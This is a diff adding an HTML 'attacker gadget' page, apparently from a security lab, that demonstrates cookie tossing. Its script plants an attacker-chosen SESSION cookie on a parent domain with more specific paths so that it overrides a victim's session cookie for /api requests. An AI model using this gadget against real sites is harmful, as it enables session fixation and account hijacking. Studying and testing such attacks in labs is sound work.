@@ -1,0 +1,35 @@
+<html>
+  <body>
+    <h3>Attacker Gadget: Cookie Tossing</h3>
+    <p>
+      This page sets a more specific-path cookie named <code>SESSION</code> on the
+      parent domain so that it takes precedence over the victim's host-only cookie
+      at broad path. Adjust the domain field to your parent domain.
+    </p>
+    <form onsubmit="return toss();">
+      <label>Parent domain (e.g., localhost): <input id="dom" value="localhost"></label><br/>
+      <label>Attacker session value: <input id="val" value="attacker-session"></label><br/>
+      <label>Specific path to target (e.g., /api): <input id="p" value="/api"></label><br/>
+      <button type="submit">Toss Cookie</button>
+    </form>
+    <pre id="out"></pre>
+    <script>
+      function toss() {
+        const domain = document.getElementById('dom').value.trim();
+        const val = document.getElementById('val').value;
+        const path = document.getElementById('p').value || '/api';
+
+        // Set domain cookie with path specificity to win precedence for /api requests
+        document.cookie = `SESSION=${encodeURIComponent(val)}; domain=${domain}; path=${path}`;
+
+        // Also optionally scope to the exact endpoint to demonstrate higher specificity
+        document.cookie = `SESSION=${encodeURIComponent(val)}; domain=${domain}; path=${path}/profile`;
+
+        document.getElementById('out').textContent = 'Injected cookies:\n' + document.cookie;
+        return false;
+      }
+    </script>
+  </body>
+</html>
+
+
